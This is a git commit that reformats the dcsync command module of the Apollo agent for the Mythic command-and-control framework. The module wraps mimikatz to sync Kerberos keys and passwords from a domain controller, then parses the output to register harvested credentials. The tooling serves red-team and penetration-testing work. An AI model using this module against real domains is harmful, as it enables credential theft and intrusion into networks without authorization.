18976b1957909b748846cd2275440222d8d310bb
Matt Ehrnschwender <mehrnschwender@specterops.io>
2024-07-30 11:55:52 -0400

    Cleanup dcsync.py
    Run autoformatters and cleanup whitespace

--- Payload_Type/apollo/apollo/mythic/agent_functions/dcsync.py
+++ Payload_Type/apollo/apollo/mythic/agent_functions/dcsync.py
@@ -1,8 +1,4 @@
-from operator import truediv
 from mythic_container.MythicCommandBase import *
-import json
-from uuid import uuid4
-from apollo.mythic.sRDI import ShellcodeRDI
 from os import path
 from mythic_container.MythicRPC import *
 import base64
@@ -16,40 +12,32 @@ class DcSyncArguments(TaskArguments):
             CommandParameter(
                 name="domain",
                 cli_name="Domain",
-                display_name="Domain", 
-                type=ParameterType.String, 
+                display_name="Domain",
+                type=ParameterType.String,
                 description="Domain to sync credentials from.",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=1,
-                        required=True
-                    )
-                ]),
+                parameter_group_info=[ParameterGroupInfo(ui_position=1, required=True)],
+            ),
             CommandParameter(
                 name="user",
                 cli_name="User",
-                display_name="User", 
+                display_name="User",
                 default_value="all",
-                type=ParameterType.String, 
+                type=ParameterType.String,
                 description="Username to sync. Defaults to all.",
                 parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=2,
-                        required=False
-                    )
-                ]),
+                    ParameterGroupInfo(ui_position=2, required=False)
+                ],
+            ),
             CommandParameter(
                 name="dc",
                 cli_name="DC",
-                display_name="DC", 
-                type=ParameterType.String, 
+                display_name="DC",
+                type=ParameterType.String,
                 description="Domain controller to sync credential material from.",
                 parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=3,
-                        required=False
-                    )
-                ]),
+                    ParameterGroupInfo(ui_position=3, required=False)
+                ],
+            ),
         ]
 
     async def parse_arguments(self):
@@ -72,12 +60,22 @@ class DcSyncArguments(TaskArguments):
 
             self.add_arg("command", "mimikatz.exe {}".format(cmd))
         else:
-            raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(DcSyncCommand.help_cmd))
+            raise Exception(
+                "No mimikatz command given to execute.\n\tUsage: {}".format(
+                    DcSyncCommand.help_cmd
+                )
+            )
 
 
-async def parse_credentials_dcsync(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
-    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
-    responses = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID))
+async def parse_credentials_dcsync(
+    task: PTTaskCompletionFunctionMessage,
+) -> PTTaskCompletionFunctionMessageResponse:
+    response = PTTaskCompletionFunctionMessageResponse(
+        Success=True, TaskStatus="success", Completed=True
+    )
+    responses = await SendMythicRPCResponseSearch(
+        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
+    )
     for output in responses.Responses:
         mimikatz_out = str(output.Response)
         comment = "task {}".format(output.TaskID)
@@ -88,11 +86,11 @@ async def parse_credentials_dcsync(task: PTTaskCompletionFunctionMessage) -> PTT
                 line = lines[i]
                 if "Username" in line:
                     # Check to see if Password is null
-                    if i+2 >= len(lines):
+                    if i + 2 >= len(lines):
                         break
                     uname = line.split(" : ")[1].strip()
-                    realm = lines[i+1].split(" : ")[1].strip()
-                    passwd = lines[i+2].split(" : ")[1].strip()
+                    realm = lines[i + 1].split(" : ")[1].strip()
+                    passwd = lines[i + 2].split(" : ")[1].strip()
                     if passwd != "(null)":
                         cred_resp = await MythicRPC().execute(
                             "create_credential",
@@ -101,7 +99,7 @@ async def parse_credentials_dcsync(task: PTTaskCompletionFunctionMessage) -> PTT
                             account=uname,
                             realm=realm,
                             credential=passwd,
-                            comment=comment
+                            comment=comment,
                         )
                         if cred_resp.status != MythicStatus.Success:
                             raise Exception("Failed to register credential")
@@ -110,9 +108,7 @@ async def parse_credentials_dcsync(task: PTTaskCompletionFunctionMessage) -> PTT
 
 class DcSyncCommand(CommandBase):
     cmd = "dcsync"
-    attributes=CommandAttributes(
-        dependencies=["execute_pe"]
-    )
+    attributes = CommandAttributes(dependencies=["execute_pe"])
     needs_admin = False
     help_cmd = "dcsync -Domain [domain] -User [user]"
     description = "Sync a user's Kerberos keys to the local machine."
@@ -123,7 +119,9 @@ class DcSyncCommand(CommandBase):
     script_only = True
     completion_functions = {"parse_credentials_dcsync": parse_credentials_dcsync}
 
-    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
+    async def create_go_tasking(
+        self, taskData: PTTaskMessageAllData
+    ) -> PTTaskCreateTaskingMessageResponse:
         response = PTTaskCreateTaskingMessageResponse(
             TaskID=taskData.Task.ID,
             Success=True,
@@ -138,6 +136,8 @@ class DcSyncCommand(CommandBase):
             response.Stderr = f"Failed to run subtask: {sub.Error}"
         return response
 
-    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+    async def process_response(
+        self, task: PTTaskMessageAllData, response: any
+    ) -> PTTaskProcessResponseMessageResponse:
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
         return resp
